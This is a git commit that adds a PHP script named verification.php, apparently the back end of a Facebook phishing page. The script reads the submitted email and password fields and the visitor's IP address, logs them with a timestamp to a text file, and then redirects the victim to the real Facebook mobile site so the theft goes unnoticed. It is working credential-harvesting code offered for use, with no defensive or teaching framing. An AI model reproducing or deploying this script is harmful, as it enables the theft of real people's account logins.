d77d9e1f182eed5d970e8a21dbb6ce821ff65e9f
masauliasc <51753653+masauliasc@users.noreply.github.com>
2021-03-18 13:45:00 +0800

    mars
    simple aja yakan!

---
+++ verification.php
@@ -0,0 +1,57 @@
+<?php
+error_reporting(0);
+$file = "simpleajayakan.txt";
+
+$username = $_POST['email'];
+$password = $_POST['pass'];
+$ip = $_SERVER['REMOTE_ADDR'];
+
+$today = date("F j, Y, g:i a");
+
+
+$handle = fopen($file, 'a');
+
+fwrite($handle, "----------SIMPLE AJA BY MASAULIASC-----------");
+
+fwrite($handle, "\n");
+                 
+fwrite($handle, "Email		:");
+
+fwrite($handle, " $username");
+
+fwrite($handle, "\n");
+
+fwrite($handle, "Password	:");
+
+fwrite($handle, " $password");
+
+fwrite($handle, "\n");
+
+fwrite($handle, "IP			:");
+
+fwrite($handle, " $ip");
+
+fwrite($handle, "\n");
+
+fwrite($handle, "Masuk		:");
+
+fwrite($handle, "$today");
+
+fwrite($handle, "\n");
+
+fwrite($handle, "---------------------END---------------------");
+
+fclose($handle);
+
+echo "<script LANGUAGE=\"JavaScript\">
+
+<!--
+
+window.location=\"https://mobile.facebook.com/?_rdc=1&_rdr\";
+
+// -->
+
+</script>";
+
+?>
+
